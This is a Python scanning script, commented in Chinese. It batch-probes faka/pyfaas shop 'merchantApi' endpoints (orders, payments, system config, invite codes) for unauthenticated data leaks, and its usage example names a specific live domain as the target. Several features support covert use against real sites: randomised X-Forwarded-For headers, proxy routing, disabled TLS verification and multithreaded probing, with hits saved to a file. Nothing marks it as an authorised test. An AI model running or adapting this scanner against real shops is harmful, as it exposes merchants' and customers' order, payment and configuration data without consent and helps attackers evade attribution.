#!/usr/bin/env python3
"""
pyfaas merchantApi 未授权/信息泄露批量探测。

示例:
  python3 merchant_scan.py -u https://s.sggyx.com
  python3 merchant_scan.py -u https://TARGET -f /data/tmp/vuln-deep/merchant_apis.txt -w 20
"""
from __future__ import annotations

import argparse
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, log, random_xff_headers, resolve_proxy, save_hit

DEFAULT_API_FILE = "/data/tools/faka/data/merchant_apis.txt"
FALLBACK_PATHS = [
    "/merchantApi/system/config",
    "/merchantApi/user/login",
    "/merchantApi/Goods/list",
    "/merchantApi/Goods/info",
    "/merchantApi/GoodsCategory/listAll",
    "/merchantApi/Order/list",
    "/merchantApi/Order/info",
    "/merchantApi/Pay/list",
    "/merchantApi/Common/captchaStart",
    "/merchantApi/Message/list",
    "/merchantApi/GoodsPool/list",
    "/merchantApi/Invite/codeList",
]


def load_paths(path: str) -> list[str]:
    p = Path(path)
    if p.exists():
        lines = [x.strip() for x in p.read_text(encoding="utf-8", errors="ignore").splitlines() if x.strip().startswith("/")]
        if lines:
            return lines
    return FALLBACK_PATHS


def probe(base: str, path: str, timeout: int, proxy: str, use_xff: bool) -> tuple[str, int, Any]:
    url = base.rstrip("/") + path
    headers = {"User-Agent": DEFAULT_UA, "Content-Type": "application/json"}
    if use_xff:
        headers.update(random_xff_headers())
    for px in ([proxy] if proxy else []) + [""]:
        proxies = {"http": px, "https": px} if px else None
        interesting = False
        try:
            r = requests.post(url, json={}, headers=headers, timeout=timeout, proxies=proxies, verify=False)
            data = json_or_text(r)
            if r.status_code == 200 and isinstance(data, dict):
                if data.get("code") == 1 and data.get("data") not in (None, "", [], {}):
                    interesting = True
                if data.get("code") == 1 and "config" in path.lower():
                    interesting = True
            return path, r.status_code, {"interesting": interesting, "body": data}
        except Exception as e:
            last = str(e)
            continue
    return path, 0, {"interesting": False, "error": last if "last" in dir() else "failed"}


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="merchantApi 扫描")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("-f", "--api-file", default=DEFAULT_API_FILE)
    ap.add_argument("-w", "--workers", type=int, default=15)
    ap.add_argument("--timeout", type=int, default=12)
    ap.add_argument("--proxy", default="auto")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--limit", type=int, default=0)
    ap.add_argument("--out", default="/data/tools/faka/out/merchant_scan.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)
    proxy = resolve_proxy(args.proxy)
    paths = load_paths(args.api_file)
    if args.limit:
        paths = paths[: args.limit]

    log(f"merchant scan {args.url} paths={len(paths)} workers={args.workers}")
    hits = 0
    start = time.time()

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(probe, args.url, p, args.timeout, proxy, args.xff): p for p in paths}
        for fut in as_completed(futs):
            path, code, res = fut.result()
            if res.get("interesting"):
                hits += 1
                save_hit(Path(args.out), "merchant_hit", {"url": args.url, "path": path, "code": code, "body": res.get("body")})
                log(f"[+] {path} -> {json.dumps(res.get('body'), ensure_ascii=False)[:200]}")
            else:
                log(f"[-] {path} [{code}]")

    log(f"完成 hits={hits} {time.time()-start:.1f}s -> {args.out}")


if __name__ == "__main__":
    main()
